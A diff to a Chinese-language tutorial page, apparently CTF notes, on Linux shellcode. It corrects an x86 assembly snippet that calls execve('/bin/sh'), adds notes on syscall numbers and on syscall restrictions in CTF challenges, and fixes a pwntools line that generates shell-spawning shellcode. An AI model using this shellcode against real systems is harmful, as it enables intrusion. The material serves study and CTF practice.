@@ -6,26 +6,13 @@
 # linux/x86 execve("/bin/sh", 0, 0)
 global _start
 _start:
-    push "/sh"
-    push "/bin"
-    mov  ebx, esp ;; pathname = "/bin/sh"
-    xor  edx, edx ;; argv = 0
-    xor  ecx, ecx ;; envp = 0
-    mov  al, 0xb  ;; execve
-    int  0x80     ;; syscall
-```
-
-```asm
-# linux/x86 execve("/bin/sh", 0, 0)
-global _start
-_start:
     xor  edx, edx ;; argv = 0
     xor  ecx, ecx ;; envp = 0
     push ecx
     push "/sh"
     push "/bin"
     mov  ebx, esp ;; pathname = "/bin/sh"
-    mov  al, 0xb  ;; execve
+    mov  al, 0xb  ;; execve NR
     int  0x80     ;; syscall
 ```
 
@@ -44,7 +31,10 @@ _start:
     syscall
 ```
 
-- [Linux 系统调用](https://publicki.top/syscall.html)
+设置参数并将系统调用的 NR(number) 写入指定寄存器后触发中断/syscall即可. 具体使用方式请参考 [Linux 系统调用](https://publicki.top/syscall.html).  
+
+!!! info "CTF"
+    可能限制系统调用的使用, 此时需要编写专门的 shellcode 只通过可用的系统调用完成任务.  
 
 ## 生成
 
@@ -53,7 +43,7 @@ _start:
 - 利用 pwntools 生成特定架构和系统的 shellcode.
 
     ```py
-    from pwn import*
+    from pwn import *
     context(log_level = 'debug', arch = 'i386', os = 'linux') # linux/x86
     shellcode = asm(shellcraft.sh())
     ```
